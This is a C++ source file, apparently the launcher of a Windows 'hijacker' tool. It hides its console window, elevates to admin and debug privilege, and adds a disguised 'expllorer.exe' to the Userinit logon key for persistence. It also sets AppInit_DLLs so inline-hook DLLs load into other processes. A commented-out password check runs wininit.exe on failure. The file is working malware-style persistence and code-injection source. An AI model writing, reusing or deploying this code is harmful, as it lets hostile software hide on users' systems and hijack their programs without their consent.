/*f:\programm\tdm-gcc-64\bin\g++ "E:\Data\Project\万花劫持器\launcher.cpp" -o "E:\Data\Project\万花劫持器\launcher.exe" -Wl,--allow-multiple-definition -lpsapi*/



#include"bin\MustInclude.h"
#include"process.h"
#include"admin.h"
#include"RegFunc.h"
#include"file.h"
#define CLS system("cls");
#define PAUSE system("pause>nul");
#include<iostream>
using namespace std;
string CurDir,BinSrc;
string key="114514";
string src;
string tgt;
string SvcPath;
bool isGuard,isConfiged=0;


int main () {
	HWND consoleWindow = GetConsoleWindow();
    ShowWindow(consoleWindow, SW_HIDE);
	RequestAdminRightsWithArgs();
	EnableDebugPrivilege();
	AddToUserInit(string(string(BIN_PATH)+"expllorer.exe").c_str());
	
	SetAppInitDLLs32("InlineHookDll32.dll");
	SetAppInitDLLs64("InlineHookDll64.dll");

	/*string YourKey;cout<<"Please enter the password=> ";cin>>YourKey;CLS
	if(YourKey!=key){system("wininit.exe");}*/




	return 0;
}